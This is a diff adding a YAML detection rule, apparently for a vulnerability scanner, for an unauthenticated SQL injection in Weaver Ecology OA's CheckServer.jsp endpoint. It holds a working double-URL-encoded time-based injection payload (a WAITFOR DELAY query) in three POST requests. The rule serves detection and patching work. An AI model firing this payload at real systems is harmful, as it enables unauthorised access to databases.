@@ -1,0 +1,44 @@
+id: ecology-mobile-plugin-checkserver-sqli
+
+info:
+  name: 泛微 Ecology OA SQL 注入漏洞
+  author: chaitin
+  severity: high
+  verified: true
+  description: |
+    泛微 Ecology OA 系统由于对用户传入的数据过滤处理不当，导致存在 SQL 注入漏洞，远程且未经过身份认证的攻击者可利用此漏洞进行 SQL 注入攻击，从而可窃取数据库敏感信息。长亭科技安全研究员经过分析后确认此漏洞同时影响 Ecology 9 和 8 两个版本系列，使用泛微 Ecology 的用户需尽快进行补丁更新升级。
+    泛微 ecology 9.x 补丁版本号 <= v10.56
+    泛微 ecology 8.x 补丁版本号 <= v10.56
+    app="泛微-协同商务系统"
+    app="泛微-协同办公OA"
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=81
+    - https://mp.weixin.qq.com/s/oO8EBzEb-9CheNPuSOJPnA
+  tags: ecology,sqli
+  created: 2024/08/30
+
+set:
+  randstr: randomInt(10000000, 50000000)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/plugin/CheckServer.jsp
+      body: |
+        timestamp=123&type=mobileSetting&settings=[{"scope":"2","module":"3","setting":"@%2527%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2527%2530%253a%2530%253a%2531%2530%2527%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%254d%256f%2562%2569%256c%2565%2544%256f%2563%2553%2565%2574%2574%2569%256e%2567%2520%2577%2568%2565%2572%2565%2527%2527%253d%2527|1","modulename":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","include":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","orasc":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F"}]
+    expression: response.status == 200 && response.body.bcontains(b'"success":"1"') && response.latency <= 11000 &&  response.latency >= 10000 # sleep 10
+  r1:
+    request:
+      method: POST
+      path: /mobile/plugin/CheckServer.jsp
+      body: |
+        timestamp=123&type=mobileSetting&settings=[{"scope":"2","module":"3","setting":"@%2527%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2527%2530%253a%2530%253a%2536%2527%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%254d%256f%2562%2569%256c%2565%2544%256f%2563%2553%2565%2574%2574%2569%256e%2567%2520%2577%2568%2565%2572%2565%2527%2527%253d%2527|1","modulename":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","include":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","orasc":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F"}]
+    expression: response.status == 200 && response.body.bcontains(b'"success":"1"') && response.latency <= 7000 &&  response.latency >= 6000 # sleep 6
+  r2:
+    request:
+      method: POST
+      path: /mobile/plugin/CheckServer.jsp
+      body: |
+        timestamp=123&type=mobileSetting&settings=[{"scope":"2","module":"3","setting":"@%2527%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2527%2530%253a%2530%253a%2531%2530%2527%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%254d%256f%2562%2569%256c%2565%2544%256f%2563%2553%2565%2574%2574%2569%256e%2567%2520%2577%2568%2565%2572%2565%2527%2527%253d%2527|1","modulename":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","include":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","orasc":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F"}]
+    expression: response.status == 200 && response.body.bcontains(b'"success":"1"') && response.latency <= 11000 &&  response.latency >= 10000 # sleep 10
+expression: r0() && r1() && r2()
